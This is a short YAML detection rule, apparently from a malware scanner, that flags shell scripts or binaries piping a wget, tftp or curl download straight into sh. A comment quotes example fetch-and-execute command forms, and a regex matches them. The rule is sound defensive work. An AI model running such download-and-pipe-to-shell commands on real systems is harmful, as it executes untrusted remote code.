defaults:
  crit: notable
  platforms: [unix, android]
  for: [elf, shell, c, cpp]

traits:
  - id: shell-pipes-downloaded-script
    desc: Pipes downloaded script into sh
    conf: 0.92
    attack: T1059.004
    if:
      type: text
      # The downloaded path varies; the durable observation is a downloader
      # feeding its response straight into a shell. Requiring a literal
      # "wget.sh"/"tftp.sh"/"curl.sh" filename missed the common forms
      # "wget http://host/p -O-|sh" and "curl http://host/bins.sh | sh".
      regex: '(?is)\b(wget|tftp|curl)\b[^|\n]{0,120}\|\s*(ba|da)?sh\b'
